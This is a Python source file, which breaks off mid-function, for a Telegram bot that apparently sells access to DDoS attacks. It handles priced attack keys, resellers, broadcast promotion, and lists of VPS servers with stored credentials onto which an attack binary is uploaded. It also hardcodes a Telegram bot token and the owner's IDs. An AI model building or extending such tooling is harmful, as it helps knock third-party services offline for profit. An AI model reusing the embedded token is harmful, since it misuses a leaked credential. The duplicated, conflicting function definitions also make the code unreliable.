
import os
import time
import logging
import re  # Add this with the other imports at the top
import asyncio
import random
import json
from telegram import Update, ReplyKeyboardMarkup
from telegram.ext import Application, CommandHandler, MessageHandler, filters, CallbackContext, ConversationHandler
from telegram import InlineKeyboardButton, InlineKeyboardMarkup
from telegram.ext import CallbackQueryHandler
from telegram.ext import ChatMemberHandler
from telegram.helpers import escape_markdown
import paramiko
from scp import SCPClient
import sys
import subprocess
from telegram import Update
from telegram.ext import CallbackContext
import asyncio
import logging
import threading
import shutil  # For directory operations
from datetime import datetime  # For timestamps
from pathlib import Path

# Suppress HTTP request logs
logging.getLogger("httpx").setLevel(logging.WARNING)
logging.getLogger("telegram").setLevel(logging.WARNING)

# Logging Configuration
logging.basicConfig(
    level=logging.DEBUG,  # Changed from INFO to DEBUG
    format="%(asctime)s - %(levelname)s - %(message)s",
)

# First define all functions
def load_keys():
    # function implementation
    pass

def load_vps():
    # function implementation
    pass

def is_owner(update: Update) -> bool:
    return update.effective_user.id == OWNER_ID

def is_coowner(update: Update) -> bool:
    return update.effective_user.id in COOWNER_IDS

USER_VPS_SETTINGS = {}  # {user_id: vps_count}
USER_VPS_PREFERENCES = {}  # {user_id: preferred_vps_count}
GROUP_IMAGES = {}  # Store group images

# Bot management system
BOT_INSTANCES = {}  # Stores running bot processes
BOT_CONFIG_FILE = "bot_configs.json"
BOT_DATA_DIR = "bot_data"  # Directory to store each bot's data

# Image configuration
START_IMAGES = []  # Define this first
current_images = START_IMAGES  # Then use it here
IMAGE_CONFIG_FILE = "image_config.json"
OFFICIAL_GROUP_NAME = ""  # Default official group name

TELEGRAM_BOT_TOKEN = '7622864970:AAF5zpg202jB4m1XBKR6Bj02XGpQ3Rem8Ks'
OWNER_USERNAME = "Rajaraj909"
CO_OWNERS = []  # List of user IDs for co-owners
OWNER_CONTACT = "Contact to buy keys"
ALLOWED_GROUP_IDS = [-1002834218110]
MAX_THREADS = 900
max_duration = 600
bot_open = False
SPECIAL_MAX_DURATION = 240
SPECIAL_MAX_THREADS = 2000
BOT_START_TIME = time.time()
DEFAULT_THREADS = 500  # Default thread count for regular attacks

OWNER_ID = 7922553903  # Your user ID
COOWNER_IDS = []  # Other admin IDs
ACTIVE_VPS_COUNT = 6  # डिफॉल्ट रूप से 6 VPS इस्तेमाल होंगे
# Display Name Configuration
GROUP_DISPLAY_NAMES = {}  # Key: group_id, Value: display_name
DISPLAY_NAME_FILE = "display_names.json"

# Link Management
LINK_FILE = "links.json"
LINKS = {}

# VPS Configuration
VPS_FILE = "vps.txt"
BINARY_NAME = "raja"
BINARY_PATH = f"/home/master/{BINARY_NAME}"
VPS_LIST = []

# Key Prices
KEY_PRICES = {
    "1H": 5,
    "2H": 10,  # Price for 1-hour key
    "3H": 15,  # Price for 1-hour key
    "4H": 20,  # Price for 1-hour key
    "5H": 25,  # Price for 1-hour key
    "6H": 30,  # Price for 1-hour key
    "7H": 35,  # Price for 1-hour key
    "8H": 40,  # Price for 1-hour key
    "9H": 45,  # Price for 1-hour key
    "10H": 50, # Price for 1-hour key
    "1D": 60,  # Price for 1-day key
    "2D": 100,  # Price for 1-day key
    "3D": 160, # Price for 1-day key
    "5D": 250, # Price for 2-day key
    "7D": 320, # Price for 2-day key
    "15D": 700, # Price for 2-day key
    "30D": 1250, # Price for 2-day key
    "60D": 2000, # Price for 2-day key,
}

# Special Key Prices
SPECIAL_KEY_PRICES = {
    "1D": 70,
    "2D": 130,  # 30 days special key price
    "3D": 250,  # 30 days special key price
    "4D": 300,  # 30 days special key price
    "5D": 400,  # 30 days special key price
    "6D": 500,  # 30 days special key price
    "7D": 550,  # 30 days special key price
    "8D": 600,  # 30 days special key price
    "9D": 750,  # 30 days special key price
    "10D": 800,  # 30 days special key price
    "11D": 850,  # 30 days special key price
    "12D": 900,  # 30 days special key price
    "13D": 950,  # 30 days special key price
    "14D": 1000,  # 30 days special key price
    "15D": 1050,  # 30 days special key price
    "30D": 1500,  # 30 days special key price
}

# Image configuration
START_IMAGES = []

def save_image_config():
    """Save image configuration to file"""
    with open(IMAGE_CONFIG_FILE, 'w') as f:
        json.dump(GROUP_IMAGES, f)

# File to store key data
KEY_FILE = "keys.txt"

# Key System
keys = {}
special_keys = {}
redeemed_users = {}
redeemed_keys_info = {}
feedback_waiting = {}

# Reseller System
resellers = set()
reseller_balances = {}

# Global Cooldown
global_cooldown = 0
last_attack_time = 0

# Track running attacks
running_attacks = {}

# Keyboards
group_user_keyboard = [
    ['/Start', 'Attack'],
    ['Redeem Key', 'Rules'],
    ['🔍 Status', '⏳ Uptime']
]
group_user_markup = ReplyKeyboardMarkup(group_user_keyboard, resize_keyboard=True)

reseller_keyboard = [
    ['/Start', 'Attack', 'Redeem Key'],
    ['Rules', 'Balance', 'Generate Key'],
    ['⏳ Uptime', 'Add VPS']  # Add this line
]
reseller_markup = ReplyKeyboardMarkup(reseller_keyboard, resize_keyboard=True)

# Settings menu keyboard with Reset VPS button
settings_keyboard = [
    ['Set Duration', 'Add Reseller'],
    ['Remove Reseller', 'Set Threads'],
    ['Add Coin', 'Set Cooldown'],
    ['Reset VPS', 'Back to Home']
]
settings_markup = ReplyKeyboardMarkup(settings_keyboard, resize_keyboard=True)

# Owner Settings menu keyboard with bot management buttons
# Update the owner_settings_keyboard
owner_settings_keyboard = [
    ['Add Bot', 'Remove Bot'],
    ['Bot List', 'Start Selected Bot'],
    ['Stop Selected Bot', 'Promote'],
    ['🔗 Manage Links', '📢 Broadcast'],
    ['🖼️ Set Group Image', '🔗 Set Group Link'],  # New buttons
    ['Back to Home']
]
owner_settings_markup = ReplyKeyboardMarkup(owner_settings_keyboard, resize_keyboard=True)

owner_keyboard = [
    ['/Start', 'Attack', 'Redeem Key'],
    ['Rules', 'Settings', 'Generate Key'],
    ['Delete Key', '🔑 Special Key', '⏳ Uptime'],
    ['OpenBot', 'CloseBot', 'Menu'],
    ['⚙️ Owner Settings', '👥 Check Users']
]
owner_markup = ReplyKeyboardMarkup(owner_keyboard, resize_keyboard=True)

co_owner_keyboard = [
    ['/Start', 'Attack', 'Redeem Key'],
    ['Rules', 'Balance', 'Generate Key'],
    ['⏳ Uptime', 'Add VPS']  # Add this line
]
co_owner_markup = ReplyKeyboardMarkup(co_owner_keyboard, resize_keyboard=True)

# Menu keyboards
owner_menu_keyboard = [
    ['Add Group ID', 'Remove Group ID'],
    ['RE Status', 'VPS Status'],
    ['Add VPS', 'Remove VPS'],
    ['Add Co-Owner', 'Remove Co-Owner'],
    ['Set Display Name', 'Upload Binary'],
    ['Delete Binary', 'Back to Home']  # Added Delete Binary button
]
owner_menu_markup = ReplyKeyboardMarkup(owner_menu_keyboard, resize_keyboard=True)

co_owner_menu_keyboard = [
    ['Add Group ID', 'Remove Group ID'],
    ['RE Status', 'VPS Status'],
    ['Set Display Name', 'Add VPS'],
    ['Back to Home', 'Upload Binary']
]
co_owner_menu_markup = ReplyKeyboardMarkup(co_owner_menu_keyboard, resize_keyboard=True)

# Conversation States
GET_DURATION = 1
GET_KEY = 2
GET_ATTACK_ARGS = 3
GET_SET_DURATION = 4
GET_SET_THREADS = 5
GET_DELETE_KEY = 6
GET_RESELLER_ID = 7
GET_REMOVE_RESELLER_ID = 8
GET_ADD_COIN_USER_ID = 9
GET_ADD_COIN_AMOUNT = 10
GET_SET_COOLDOWN = 11
GET_SPECIAL_KEY_DURATION = 12
GET_SPECIAL_KEY_FORMAT = 13
ADD_GROUP_ID = 14
REMOVE_GROUP_ID = 15
MENU_SELECTION = 16
GET_RESELLER_INFO = 17
GET_VPS_INFO = 18
GET_VPS_TO_REMOVE = 19
CONFIRM_BINARY_UPLOAD = 20
GET_ADD_CO_OWNER_ID = 21
GET_REMOVE_CO_OWNER_ID = 22
GET_DISPLAY_NAME = 23
GET_GROUP_FOR_DISPLAY_NAME = 24
GET_BOT_TOKEN = 25
GET_OWNER_USERNAME = 26
SELECT_BOT_TO_START = 27
SELECT_BOT_TO_STOP = 28
CONFIRM_BINARY_DELETE = 29
GET_LINK_NUMBER = 30
GET_LINK_URL = 31
GET_VPS_COUNT = 32
GET_NEW_IMAGE_URL = 33
GET_NEW_GROUP_NAME = 34
GET_BROADCAST_MESSAGE = 35
GET_GROUP_LINK = 36
GET_KEY_TYPE = 37  # Add this line for key type selection


def get_uptime():
    uptime_seconds = int(time.time() - BOT_START_TIME)
    days, remainder = divmod(uptime_seconds, 86400)
    hours, remainder = divmod(remainder, 3600)
    minutes, seconds = divmod(remainder, 60)
    return f"{days}d {hours}h {minutes}m {seconds}s"
    
def load_image_config():
    """Load image configuration from file"""
    global GROUP_IMAGES
    if os.path.exists(IMAGE_CONFIG_FILE):
        try:
            with open(IMAGE_CONFIG_FILE, 'r') as f:
                GROUP_IMAGES = json.load(f)
        except (json.JSONDecodeError, ValueError):
            GROUP_IMAGES = {'default': {'url': '', 'caption': ''}}
    else:
        GROUP_IMAGES = {'default': {'url': '', 'caption': ''}}
            

def get_display_name(group_id=None):
    """Returns the styled display name for the owner"""
    base_name = GROUP_DISPLAY_NAMES.get(str(group_id) if group_id else 'default', f"✨ {OWNER_USERNAME} ✨")
    
    # Add styling based on context
    if group_id:
        return f"🌟 {base_name} 🌟 (Group Admin)"
    return f"👑 {base_name} 👑"

async def owner_settings(update: Update, context: CallbackContext):
    if not is_owner(update):
        await update.message.reply_text("❌ *Only the owner can access these settings!*", parse_mode='Markdown')
        return
    
    current_display_name = get_display_name(update.effective_chat.id if update.effective_chat.type in ['group', 'supergroup'] else None)
    
    await update.message.reply_text(
        f"⚙️ *Owner Settings Menu*\n\n"
        f"Select an option below:\n\n"
        f"👑 *Bot Owner:* {current_display_name}",
        parse_mode='Markdown',
        reply_markup=owner_settings_markup
    )
    
def get_group_image(group_id):
    """Get image for specific group or default"""
    group_id = str(group_id)
    if group_id in GROUP_IMAGES:
        return GROUP_IMAGES[group_id]
    return GROUP_IMAGES.get('default', {'url': '', 'caption': ''})

async def set_display_name(update: Update, new_name: str, group_id=None):
    """Updates the display name for specific group or default"""
    if group_id is not None:
        GROUP_DISPLAY_NAMES[group_id] = new_name
    else:
        GROUP_DISPLAY_NAMES['default'] = new_name
    
    with open(DISPLAY_NAME_FILE, 'w') as f:
        json.dump(GROUP_DISPLAY_NAMES, f)
    
    if update:
        await update.message.reply_text(
            f"✅ Display name updated to: {new_name}" + 
            (f" for group {group_id}" if group_id else " as default name"),
            parse_mode='Markdown'
        )

def load_vps():
    global VPS_LIST
    VPS_LIST = []
    if os.path.exists(VPS_FILE):
        with open(VPS_FILE, 'r') as f:
            for line in f.readlines():
                line = line.strip()
                if line and len(line.split(',')) == 3:  # IP,username,password फॉर्मेट चेक करें
                    VPS_LIST.append(line.split(','))

async def set_vps_count(update: Update, context: CallbackContext):
    """Handler for setting the number of active VPS servers"""
    try:
        # Check authorization
        if not is_owner(update) and not is_coowner(update):
            await update.message.reply_text(
                "🚫 *Access Denied*\nOnly owner or co-owners can configure VPS!",
                parse_mode='Markdown'
            )
            return ConversationHandler.END
        
        # Check if VPS list is available
        if not VPS_LIST:
            await update.message.reply_text(
                "❌ *No VPS Configured*\nPlease set up VPS servers first!",
                parse_mode='Markdown'
            )
            return ConversationHandler.END
        
        # Prepare response with current status
        status_msg = (
            f"⚙️ *VPS Configuration*\n\n"
            f"• Current Active VPS: `{ACTIVE_VPS_COUNT}`\n"
            f"• Total Available VPS: `{len(VPS_LIST)}`\n"
            f"• Recommended Max: `{min(4, len(VPS_LIST))}`\n\n"
            f"Please enter new VPS count (1-{len(VPS_LIST)}):"
        )
        
        # Send with Markdown and a cancel button
        await update.message.reply_text(
            status_msg,
            parse_mode='Markdown',
            reply_markup=ReplyKeyboardMarkup(
                [["1", "2"], ["3", "4"], ["Cancel"]],
                one_time_keyboard=True
            )
        )
        
        return GET_VPS_COUNT
        
    except Exception as e:
        logging.error(f"Error in set_vps_count: {str(e)}")
        await update.message.reply_text(
            "⚠️ *System Error*\nFailed to initialize VPS configuration",
            parse_mode='Markdown'
        )
        return ConversationHandler.END

def save_resellers():
    """Save reseller data to file"""
    data = {
        'resellers': list(resellers),
        'balances': reseller_balances
    }
    with open('resellers.json', 'w') as f:
        json.dump(data, f)

def load_resellers():
    """Load reseller data from file"""
    if os.path.exists('resellers.json'):
        try:
            with open('resellers.json', 'r') as f:
                data = json.load(f)
                resellers.update(set(data.get('resellers', [])))
                reseller_balances.update(data.get('balances', {}))
        except (json.JSONDecodeError, ValueError):
            pass

async def set_vps_count_input(update: Update, context: CallbackContext):
    global ACTIVE_VPS_COUNT
    
    user_id = update.effective_user.id
    try:
        count = int(update.message.text.strip())
        
        # Check authorization - owner can set any count up to total VPS
        if is_owner(update):
            max_allowed = len(VPS_LIST)
        # Co-owners have a fixed limit (adjust as needed)
        elif is_coowner(update):
            max_allowed = min(4, len(VPS_LIST))  # Example: max 4 for co-owners
        # Regular users can't change VPS count
        else:
            await update.message.reply_text(
                "❌ *Only owner or co-owners can configure VPS!*",
                parse_mode='Markdown'
            )
            return ConversationHandler.END
        
        # Validate input
        if 1 <= count <= max_allowed:
            ACTIVE_VPS_COUNT = count
            
            # Store user's preference if needed
            if is_owner(update) or is_coowner(update):
                USER_VPS_PREFERENCES[user_id] = count
            
            await update.message.reply_text(
                f"✅ *VPS Configuration Updated*\n"
                f"• Active VPS Count: *{count}*\n"
                f"• Max Allowed: *{max_allowed}*",
                parse_mode='Markdown'
            )
            
            # Log this change
            logging.info(f"User {user_id} set VPS count to {count}")
            
        else:
            await update.message.reply_text(
                f"❌ *Invalid VPS Count*\n"
                f"You can only set between 1 and {max_allowed} VPS\n\n"
                f"*Current active VPS:* {ACTIVE_VPS_COUNT}",
                parse_mode='Markdown'
            )
            
    except ValueError:
        await update.message.reply_text(
            "❌ *Invalid Input*\nPlease enter a number between 1 and your max allowed VPS count",
            parse_mode='Markdown'
        )
    except Exception as e:
        logging.error(f"Error in set_vps_count_input: {str(e)}", exc_info=True)
        await update.message.reply_text(
            "⚠️ *System Error*\nFailed to update VPS configuration",
            parse_mode='Markdown'
        )
    
    return ConversationHandler.END

# Add this function
async def promote(update: Update, context: CallbackContext):
    if not is_owner(update):
        await update.message.reply_text(
            "❌ *Only owner can promote\\!*", 
            parse_mode='MarkdownV2'
        )
        return
    
    # Create the promotion message with proper escaping
    promotion_message = (
        "🔰 *Join our groups for more information, free keys, and hosting details\\!*\n\n"
        "Click the buttons below to join\\:"
    )
    
    # Create buttons dynamically based on available links
    keyboard = []
    if 'link_1' in LINKS and LINKS['link_1']:
        keyboard.append([InlineKeyboardButton("Join Group 1", url=LINKS['link_1'])])
    if 'link_2' in LINKS and LINKS['link_2']:
        keyboard.append([InlineKeyboardButton("Join Group 2", url=LINKS['link_2'])])
    if 'link_3' in LINKS and LINKS['link_3']:
        keyboard.append([InlineKeyboardButton("Join Group 3", url=LINKS['link_3'])])
    if 'link_4' in LINKS and LINKS['link_4']:
        keyboard.append([InlineKeyboardButton("Join Group 4", url=LINKS['link_4'])])
    
    # If no links are set, show a message
    if not keyboard:
        await update.message.reply_text(
            "ℹ️ No links have been set up yet\\. Use the 'Manage Links' option to add links\\.",
            parse_mode='MarkdownV2'
        )
        return
    
    reply_markup = InlineKeyboardMarkup(keyboard)
    
    try:
        # Send to current chat first
        await update.message.reply_text(
            promotion_message,
            parse_mode='MarkdownV2',
            reply_markup=reply_markup
        )
    except Exception as e:
        logging.error(f"Error sending initial promotion message: {str(e)}")
        await update.message.reply_text(
            "❌ Failed to send promotion message\\!",
            parse_mode='MarkdownV2'
        )
        return
    
    # Track success/failure
    success_count = 0
    fail_count = 0
    group_success = 0
    private_success = 0
    
    # Get all chats the bot is in
    all_chats = set()
    
    # Add allowed groups
    for group_id in ALLOWED_GROUP_IDS:
        all_chats.add(group_id)
    
    # Add tracked private chats (users who have interacted with bot)
    if 'users_interacted' in context.bot_data:
        for user_id in context.bot_data['users_interacted']:
            all_chats.add(user_id)
    
    # Send promotion to all chats
    for chat_id in all_chats:
        try:
            await context.bot.send_message(
                chat_id=chat_id,
                text=promotion_message,
                parse_mode='MarkdownV2',
                reply_markup=reply_markup,
                disable_web_page_preview=True
            )
            success_count += 1
            
            # Track group vs private
            try:
                chat = await context.bot.get_chat(chat_id)
                if chat.type in ['group', 'supergroup']:
                    group_success += 1
                else:
                    private_success += 1
            except Exception as e:
                logging.error(f"Error getting chat info for {chat_id}: {str(e)}")
                
            await asyncio.sleep(0.5)  # Rate limiting
        except Exception as e:
            logging.error(f"Failed to send promotion to {chat_id}: {str(e)}")
            fail_count += 1
    
    # Send report with proper escaping
    try:
        await update.message.reply_text(
            f"📊 *Promotion Results*\n\n"
            f"✅ Successfully sent to\\: {success_count} chats\n"
            f"❌ Failed to send to\\: {fail_count} chats\n\n"
            f"• Groups\\: {group_success}\n"
            f"• Private chats\\: {private_success}",
            parse_mode='MarkdownV2'
        )
    except Exception as e:
        logging.error(f"Error sending promotion results: {str(e)}")
        await update.message.reply_text(
            "❌ Failed to send promotion results\\!",
            parse_mode='MarkdownV2'
        )

def load_links():
    """Load links from file"""
    global LINKS
    if os.path.exists(LINK_FILE):
        try:
            with open(LINK_FILE, 'r') as f:
                LINKS = json.load(f)
        except (json.JSONDecodeError, ValueError):
            LINKS = {}

def save_links():
    """Save links to file"""
    with open(LINK_FILE, 'w') as f:
        json.dump(LINKS, f)

async def manage_links(update: Update, context: CallbackContext):
    """Show link management menu"""
    if not is_owner(update):
        await update.message.reply_text("❌ Only owner can manage links!", parse_mode='Markdown')
        return
    
    # Create the message with current links
    current_links = (
        "🔗 *Link Management*\n\n"
        "Current Links:\n"
        f"1. {LINKS.get('link_1', 'Not set')}\n"
        f"2. {LINKS.get('link_2', 'Not set')}\n"
        f"3. {LINKS.get('link_3', 'Not set')}\n"
        f"4. {LINKS.get('link_4', 'Not set')}\n\n"
        "Enter the number (1, 2, 3, or 4) of the link you want to replace:"
    )
    
    await update.message.reply_text(
        current_links,
        parse_mode='Markdown'
    )
    return GET_LINK_NUMBER

async def get_link_number(update: Update, context: CallbackContext):
    """Get which link number to update"""
    try:
        link_num = int(update.message.text)
        if link_num not in [1, 2, 3, 4]:
            raise ValueError
        
        context.user_data['editing_link'] = f"link_{link_num}"
        await update.message.reply_text(
            f"⚠️ Enter new URL for link {link_num}:",
            parse_mode='Markdown'
        )
        return GET_LINK_URL
    except ValueError:
        await update.message.reply_text(
            "❌ Invalid input! Please enter 1, 2, 3, or 4.",
            parse_mode='Markdown'
        )
        return ConversationHandler.END

async def get_link_url(update: Update, context: CallbackContext):
    if 'editing_link' not in context.user_data:
        return ConversationHandler.END
    
    link_key = context.user_data['editing_link']
    new_url = update.message.text.strip()
    
    # Basic URL validation
    if not (new_url.startswith('http://') or new_url.startswith('https://')):
        await update.message.reply_text("❌ Invalid URL! Must start with http:// or https://")
        return ConversationHandler.END
    
    LINKS[link_key] = new_url
    save_links()
    
    # Clear the editing state
    context.user_data.pop('editing_link', None)
    
    await update.message.reply_text(
        "✅ Link updated successfully\\!\n"
        f"New URL: {escape_markdown(new_url, version=2)}",
        parse_mode='MarkdownV2'
    )
    return ConversationHandler.END

async def broadcast_start(update: Update, context: CallbackContext):
    if not is_owner(update):
        await update.message.reply_text(
            "❌ *Only the owner can broadcast messages\\!*", 
            parse_mode='MarkdownV2'
        )
        return ConversationHandler.END
    
    await update.message.reply_text(
        "⚠️ *Enter the message you want to broadcast to all channels, groups and private chats\\:*\n"
        "You can send text, photos \\(with optional caption\\), or documents \\(with optional caption\\)\\.\n\n"
        "Or reply to any message with /broadcast to forward it to all chats\\.",
        parse_mode='MarkdownV2'
    )
    return GET_BROADCAST_MESSAGE

async def broadcast_message(update: Update, context: CallbackContext):
    # Determine if this is a reply or new message
    message_to_broadcast = update.message.reply_to_message if update.message.reply_to_message else update.message
    
    # Track results
    results = {
        'success': 0,
        'failed': 0,
        'groups': 0,
        'private': 0
    }
    
    # Get all target chats
    target_chats = set(ALLOWED_GROUP_IDS)
    if 'users_interacted' in context.bot_data:
        target_chats.update(context.bot_data['users_interacted'])
    
    # Broadcast to all chats
    for chat_id in target_chats:
        try:
            # Forward the message as-is to maintain all formatting and media
            await message_to_broadcast.forward(chat_id=chat_id)
            results['success'] += 1
            
            # Track chat type
            try:
                chat = await context.bot.get_chat(chat_id)
                if chat.type in ['group', 'supergroup']:
                    results['groups'] += 1
                else:
                    results['private'] += 1
            except Exception as e:
                logging.warning(f"Couldn't determine chat type for {chat_id}: {e}")
            
            await asyncio.sleep(0.3)  # Rate limiting
        except Exception as e:
            logging.error(f"Failed to broadcast to {chat_id}: {str(e)}")
            results['failed'] += 1
    
    # Send report with proper MarkdownV2 escaping
    report_message = (
        f"📊 *Broadcast Results*\n\n"
        f"✅ *Successfully sent to\\:* {results['success']} chats\n"
        f"❌ *Failed to send to\\:* {results['failed']} chats\n\n"
        f"• *Groups\\:* {results['groups']}\n"
        f"• *Private chats\\:* {results['private']}"
    )
    
    await update.message.reply_text(
        report_message,
        parse_mode='MarkdownV2'
    )
    return ConversationHandler.END

def load_display_name():
    """Loads the display names from file"""
    global GROUP_DISPLAY_NAMES
    if os.path.exists(DISPLAY_NAME_FILE):
        try:
            with open(DISPLAY_NAME_FILE, 'r') as f:
                GROUP_DISPLAY_NAMES = json.load(f)
            new_dict = {}
            for k, v in GROUP_DISPLAY_NAMES.items():
                try:
                    if k != 'default':
                        new_dict[int(k)] = v
                    else:
                        new_dict[k] = v
                except ValueError:
                    new_dict[k] = v
            GROUP_DISPLAY_NAMES = new_dict
        except (json.JSONDecodeError, ValueError):
            GROUP_DISPLAY_NAMES = {'default': f"@{OWNER_USERNAME}"}
    else:
        GROUP_DISPLAY_NAMES = {'default': f"@{OWNER_USERNAME}"}

def load_keys():
    if not os.path.exists(KEY_FILE):
        return

    with open(KEY_FILE, "r") as file:
        for line in file:
            key_type, key_data = line.strip().split(":", 1)
            if key_type == "ACTIVE_KEY":
                parts = key_data.split(",")
                if len(parts) == 2:
                    key, expiration_time = parts
                    keys[key] = {
                        'expiration_time': float(expiration_time),
                        'generated_by': None
                    }
                elif len(parts) == 3:
                    key, expiration_time, generated_by = parts
                    keys[key] = {
                        'expiration_time': float(expiration_time),
                        'generated_by': int(generated_by)
                    }
            elif key_type == "REDEEMED_KEY":
                key, generated_by, redeemed_by, expiration_time = key_data.split(",")
                redeemed_users[int(redeemed_by)] = float(expiration_time)
                redeemed_keys_info[key] = {
                    'generated_by': int(generated_by),
                    'redeemed_by': int(redeemed_by)
                }
            elif key_type == "SPECIAL_KEY":
                key, expiration_time, generated_by = key_data.split(",")
                special_keys[key] = {
                    'expiration_time': float(expiration_time),
                    'generated_by': int(generated_by)
                }
            elif key_type == "REDEEMED_SPECIAL_KEY":
                key, generated_by, redeemed_by, expiration_time = key_data.split(",")
                redeemed_users[int(redeemed_by)] = {
                    'expiration_time': float(expiration_time),
                    'is_special': True
                }
                redeemed_keys_info[key] = {
                    'generated_by': int(generated_by),
                    'redeemed_by': int(redeemed_by),
                    'is_special': True
                }

def save_keys():
    with open(KEY_FILE, "w") as file:
        for key, key_info in keys.items():
            if key_info['expiration_time'] > time.time():
                file.write(f"ACTIVE_KEY:{key},{key_info['expiration_time']},{key_info['generated_by']}\n")

        for key, key_info in special_keys.items():
            if key_info['expiration_time'] > time.time():
                file.write(f"SPECIAL_KEY:{key},{key_info['expiration_time']},{key_info['generated_by']}\n")

        for key, key_info in redeemed_keys_info.items():
            if key_info['redeemed_by'] in redeemed_users:
                if 'is_special' in key_info and key_info['is_special']:
                    file.write(f"REDEEMED_SPECIAL_KEY:{key},{key_info['generated_by']},{key_info['redeemed_by']},{redeemed_users[key_info['redeemed_by']]['expiration_time']}\n")
                else:
                    file.write(f"REDEEMED_KEY:{key},{key_info['generated_by']},{key_info['redeemed_by']},{redeemed_users[key_info['redeemed_by']]}\n")

def load_bot_configs():
    """Load bot configurations from file with error handling"""
    if not os.path.exists(BOT_CONFIG_FILE):
        return []
    
    try:
        with open(BOT_CONFIG_FILE, 'r') as f:
            configs = json.load(f)
            # Validate configs
            if not isinstance(configs, list):
                logging.error("Invalid bot configs format, resetting to empty list")
                return []
            return configs
    except (json.JSONDecodeError, ValueError, IOError) as e:
        logging.error(f"Error loading bot configs: {e}")
        return []

def save_bot_configs(configs):
    """Save bot configurations to file with error handling"""
    try:
        with open(BOT_CONFIG_FILE, 'w') as f:
            json.dump(configs, f, indent=2)
    except (json.JSONDecodeError, ValueError, IOError) as e:
        logging.error(f"Error saving bot configs: {e}")

def load_vps():
    global VPS_LIST
    if os.path.exists(VPS_FILE):
        with open(VPS_FILE, 'r') as f:
            VPS_LIST = [line.strip().split(',') for line in f.readlines()]

def save_vps():
    with open(VPS_FILE, 'w') as f:
        for vps in VPS_LIST:
            f.write(','.join(vps) + '\n')

def is_allowed_group(update: Update):
    chat = update.effective_chat
    return chat.type in ['group', 'supergroup'] and chat.id in ALLOWED_GROUP_IDS

def is_owner(update: Update):
    return update.effective_user.username == OWNER_USERNAME

def is_co_owner(update: Update):
    return update.effective_user.id in CO_OWNERS

def is_reseller(update: Update):
    return update.effective_user.id in resellers

def is_authorized_user(update: Update):
    return is_owner(update) or is_co_owner(update) or is_reseller(update)

def get_random_start_image():
    return random.choice(START_IMAGES)

async def reset_vps(update: Update, context: CallbackContext):
    """Reset all busy VPS to make them available again"""
    if not is_owner(update):
        await update.message.reply_text("❌ *Only owner or co-owners can reset VPS!*", parse_mode='Markdown')
        return
    
    global running_attacks
    
    # Count how many VPS are busy
    busy_count = len(running_attacks)
    
    if busy_count == 0:
        await update.message.reply_text("ℹ️ *No VPS are currently busy.*", parse_mode='Markdown')
        return
    
    # Clear all running attacks
    running_attacks.clear()
    
    current_display_name = get_display_name(update.effective_chat.id if update.effective_chat.type in ['group', 'supergroup'] else None)
    
    await update.message.reply_text(
        f"✅ *Reset {busy_count} busy VPS - they are now available for new attacks!*\n\n"
        f"👑 *Bot Owner:* {current_display_name}",
        parse_mode='Markdown'
    )

async def add_bot_instance(update: Update, context: CallbackContext):
    """Add a new bot instance with proper file management"""
    if not is_owner(update):
        await update.message.reply_text("❌ Only owner can add bot instances!", parse_mode='Markdown')
        return ConversationHandler.END
    
    await update.message.reply_text(
        "⚠️ *Enter the new bot token:*\n\n"
        "Format: `1234567890:ABCDEFGHIJKLMNOPQRSTUVWXYZ`",
        parse_mode='MarkdownV2'
    )
    return GET_BOT_TOKEN
    
async def set_new_group_name(update: Update, context: CallbackContext):
    """Set the new official group name"""
    global OFFICIAL_GROUP_NAME
    new_name = update.message.text.strip()
    
    # Update all image captions to use new group name
    for image in current_images:
        if 'caption' in image:
            # Replace the old group name in the caption
            image['caption'] = image['caption'].replace(OFFICIAL_GROUP_NAME, new_name)
    
    OFFICIAL_GROUP_NAME = new_name
    save_image_config()
    
    await update.message.reply_text(
        f"✅ Official group name changed to: {new_name}\n"
        "All image captions have been updated.",
        parse_mode='Markdown'
    )
    return ConversationHandler.END

async def show_users(update: Update, context: CallbackContext):
    if not is_owner(update):
        await update.message.reply_text("❌ *Only the owner can check users!*", parse_mode='Markdown')
        return
    
    try:
        # Get owner info
        try:
            owner_chat = await context.bot.get_chat(OWNER_USERNAME)
            owner_info = f"👑 Owner: {owner_chat.full_name} (@{owner_chat.username if owner_chat.username else 'N/A'})"
        except Exception as e:
            owner_info = f"👑 Owner: @{OWNER_USERNAME} (Could not fetch details)"
        
        # Get co-owners info
        co_owners_info = []
        for co_owner_id in CO_OWNERS:
            try:
                co_owner_chat = await context.bot.get_chat(co_owner_id)
                co_owners_info.append(
                    f"🔹 Co-Owner: {co_owner_chat.full_name} (@{co_owner_chat.username if co_owner_chat.username else 'N/A'})"
                )
            except Exception as e:
                co_owners_info.append(f"🔹 Co-Owner: ID {co_owner_id} (Could not fetch details)")
        
        # Get resellers info
        resellers_info = []
        for reseller_id in resellers:
            try:
                reseller_chat = await context.bot.get_chat(reseller_id)
                balance = reseller_balances.get(reseller_id, 0)
                resellers_info.append(
                    f"🔸 Reseller: {reseller_chat.full_name} (@{reseller_chat.username if reseller_chat.username else 'N/A'}) - Balance: {balance} coins"
                )
            except Exception as e:
                resellers_info.append(f"🔸 Reseller: ID {reseller_id} (Could not fetch details)")
        
        # Compile the message
        message_parts = [
            "📊 *User Information*",
            "",
            owner_info,
            "",
            "*Co-Owners:*",
            *co_owners_info,
            "",
            "*Resellers:*",
            *resellers_info
        ]
        
        message = "\n".join(message_parts)
        
        # Split message if too long
        if len(message) > 4000:
            parts = [message[i:i+4000] for i in range(0, len(message), 4000)]
            for part in parts:
                await update.message.reply_text(part, parse_mode='Markdown')
        else:
            await update.message.reply_text(message, parse_mode='Markdown')
            
    except Exception as e:
        logging.error(f"Error in show_users: {str(e)}", exc_info=True)
        await update.message.reply_text(
            "❌ *An error occurred while fetching user information.*",
            parse_mode='Markdown'
        )  
        
async def change_image_link(update: Update, context: CallbackContext):
    """Command to change the image link"""
    if not is_owner(update):
        await update.message.reply_text("❌ Only owner or co-owners can change image links!", parse_mode='Markdown')
        return ConversationHandler.END
    
    await update.message.reply_text(
        f"⚠️ Current image URL: {current_images[0]['url'] if current_images else 'Not set'}\n"
        "Enter the new image URL (must start with http:// or https://):",
        parse_mode='Markdown'
    )
    return GET_NEW_IMAGE_URL
    
def create_welcome_message(owner_name, is_owner=False, is_coowner=False, is_reseller=False):
    """Create welcome message with group-style buttons for everyone"""
    # Determine user role with emoji
    if is_owner:
        role = "👑 *Owner*"
        role_emoji = "👑"
        role_color = "#FFD700"  # Gold
    elif is_coowner:
        role = "🔧 *Co-Owner*"
        role_emoji = "🔧"
        role_color = "#4169E1"  # Royal Blue
    elif is_reseller:
        role = "💰 *Reseller*"
        role_emoji = "💰"
